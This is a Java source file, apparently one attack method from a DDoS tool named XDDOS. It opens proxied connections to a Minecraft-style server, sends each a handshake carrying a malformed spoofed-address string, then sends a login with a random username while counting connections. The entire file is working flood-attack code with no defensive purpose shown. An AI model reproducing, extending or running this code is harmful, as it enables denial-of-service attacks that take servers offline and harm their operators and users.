package XD.XDDOS.methods;

import XD.XDDOS.Main;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Random;

public class InvalidIPSpoof
  implements Method {
  private SecureRandom r = new SecureRandom();
  private String lol = "";
  private int a = 14;
  
  public InvalidIPSpoof() {
    for (int i = 1; i < this.a + 1; i++) {
      this.lol = String.valueOf(this.lol) + String.valueOf(this.lol);
    }
  }

  
  private String randomString(int len) {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(len);
    
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    } 
    
    return buffer.toString();
  }
  
  public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
    while ((paramInt & 0xFFFFFF80) != 0) {
      out.writeByte(paramInt & 0x7F | 0x80);
      paramInt >>>= 7;
    } 
    
    out.writeByte(paramInt);
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new Handshake(Main.protcolID, "1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1......\000.\000f84c6a790a4e45e0879bcd49ebd4c4e2", Main.port, 2)).getWrappedPacket()));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString(14))).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
